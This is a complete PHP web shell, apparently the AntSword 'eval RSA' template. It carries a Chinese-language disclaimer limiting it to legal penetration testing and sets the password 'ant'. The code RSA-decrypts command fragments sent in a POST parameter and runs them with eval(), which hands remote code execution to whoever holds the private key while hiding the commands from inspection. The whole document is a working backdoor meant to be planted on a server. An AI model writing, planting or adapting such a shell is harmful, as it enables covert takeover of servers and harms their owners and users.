<?php 
/**
*              _   ____                       _
*   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
*  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
* | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
*  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
* ———————————————————————————————————————————————
*     AntSword PHP eval RSA Script
* 
*     警告：
*         此脚本仅供合法的渗透测试以及爱好者参考学习
*          请勿用于非法用途，否则将追究其相关责任！
* ———————————————————————————————————————————————
* pwd=ant
*/
$cmd = @$_POST['ant'];
$publicKey = <<<EOF
-----BEGIN PUBLIC KEY-----
Input your Public Key
-----END PUBLIC KEY-----
EOF;
$cmds = explode("|", $cmd);
$publicKey = openssl_pkey_get_public($publicKey);
$cmd = '';
foreach ($cmds as $value) {
	if (openssl_public_decrypt(base64_decode($value), $de, $publicKey)) {
		$cmd .= $de;
	}
}
eval($cmd);
?>